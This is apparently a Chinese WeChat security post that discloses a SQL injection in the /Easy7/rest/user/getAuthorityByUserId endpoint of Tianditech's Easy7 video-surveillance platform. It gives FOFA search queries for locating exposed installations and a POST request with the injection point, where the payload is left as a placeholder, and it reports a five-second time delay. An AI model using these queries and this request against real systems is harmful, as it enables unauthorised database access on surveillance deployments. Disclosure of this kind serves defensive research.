---
title: 天地伟业Easy7 /Easy7/rest/user/getAuthorityByUserId SQL注入漏洞
url: https://mp.weixin.qq.com/s/M5YTxIOA6ZU1EVWyNkNM-g
source: Doonsec's feed
date: 2026-05-11
fetch_date: 2026-05-12T05:37:07.338162
---

# 天地伟业Easy7 /Easy7/rest/user/getAuthorityByUserId SQL注入漏洞

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ZrTsB3aQgWDnxutcloKl60sdWqRN8Jpc7GJxyLUASbqsKYhIy34JnDYDsJ791qfpd2WJicsibfEwfwEVZ0vbBMLhfSuZcEf9EjNLwz52ftfBg/0?wx_fmt=jpeg)

# 天地伟业Easy7 /Easy7/rest/user/getAuthorityByUserId SQL注入漏洞

0day收割机

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# 漏洞简介

天地伟业Easy7是一款用于视频监控管理的软件系统。

该系统的 /Easy7/rest/user/getAuthorityByUserId 接口存在SQL注入漏洞，攻击者可以通过构造恶意请求执行任意SQL语句，可能导致敏感信息泄露或数据库被篡改。

# 影响版本

# fofa语法

> body="/Easy7/apps/WebService/LogIn.jsp" || body="Easy7/VideoLib.EXE" || body="/Easy7/index.html" || (body="<img src=\"./images/ico/Easy7\_logo\_transparent.png") && title="平台"

# 漏洞复现

```
POST /Easy7/rest/user/getAuthorityByUserId HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded

userId=1&objId=SQLI_POC&authTypes=[1]
```

![](https://mmbiz.qpic.cn/mmbiz_png/ZrTsB3aQgWBicO6tH09ibyMfDFvf0Ao2KgIiaWMK7WCUMDebfZcAIbVFghic8bt0uumAgvHM8ySCibCiaibVM6SIcNwan4nTUBbE3BknlHJAWFNViaI/640?wx_fmt=png&from=appmsg)

成功延时5秒

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/MtjOicQLUtFg3CRl5wFA4loxN8krcYMpuzNjcVibkricNCB4GC9k3ib6UQLsf2RIuOcJFHT568lSjAqz8ze0oMAgxw/0?wx_fmt=png)

0day收割机

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/MtjOicQLUtFg3CRl5wFA4loxN8krcYMpuzNjcVibkricNCB4GC9k3ib6UQLsf2RIuOcJFHT568lSjAqz8ze0oMAgxw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过